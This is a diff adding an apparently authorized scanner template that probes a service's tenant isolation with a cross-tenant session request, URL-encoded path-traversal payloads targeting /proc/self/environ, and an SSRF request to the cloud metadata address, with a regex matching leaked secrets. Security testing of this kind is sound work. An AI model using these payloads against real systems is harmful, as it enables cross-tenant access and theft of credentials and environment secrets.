@@ -1,0 +1,54 @@
+id: persistent-codex-wp30-tenant-boundary
+
+info:
+  name: Persistent Codex tenant boundary and unsafe locator probes
+  author: persistent-codex-security
+  severity: high
+  description: Authorized WP30 probe for cross-tenant, traversal, metadata SSRF and secret reflection.
+  tags: wp30,idor,traversal,ssrf
+
+http:
+  - raw:
+      - |
+        GET /v1/sessions/__WP30_FOREIGN_SESSION_ID__/events?after=0 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer __WP30_TENANT_A_TOKEN__
+        X-Tenant-Id: __WP30_TENANT_A_ID__
+        X-Organization-Id: __WP30_TENANT_A_ORG_ID__
+        X-Workspace-Id: __WP30_TENANT_A_WORKSPACE_ID__
+      - |
+        GET /v1/artifacts/..%2f..%2fproc%2fself%2fenviron HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer __WP30_TENANT_A_TOKEN__
+        X-Tenant-Id: __WP30_TENANT_A_ID__
+        X-Organization-Id: __WP30_TENANT_A_ORG_ID__
+        X-Workspace-Id: __WP30_TENANT_A_WORKSPACE_ID__
+      - |
+        GET /v1/artifacts/%2e%2e/%2e%2e/sys/kernel/hostname HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer __WP30_TENANT_A_TOKEN__
+        X-Tenant-Id: __WP30_TENANT_A_ID__
+        X-Organization-Id: __WP30_TENANT_A_ORG_ID__
+        X-Workspace-Id: __WP30_TENANT_A_WORKSPACE_ID__
+      - |
+        POST /v1/sources HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer __WP30_TENANT_A_TOKEN__
+        Content-Type: application/json
+        X-Tenant-Id: __WP30_TENANT_A_ID__
+        X-Organization-Id: __WP30_TENANT_A_ORG_ID__
+        X-Workspace-Id: __WP30_TENANT_A_WORKSPACE_ID__
+
+        {"kind":"url","url":"http://169.254.169.254/latest/meta-data/"}
+    stop-at-first-match: false
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 202
+      - type: regex
+        part: body
+        regex:
+          - '(?i)(authorization|bearer|api[_-]?key|secret|169\.254\.169\.254|/proc/|/sys/)'
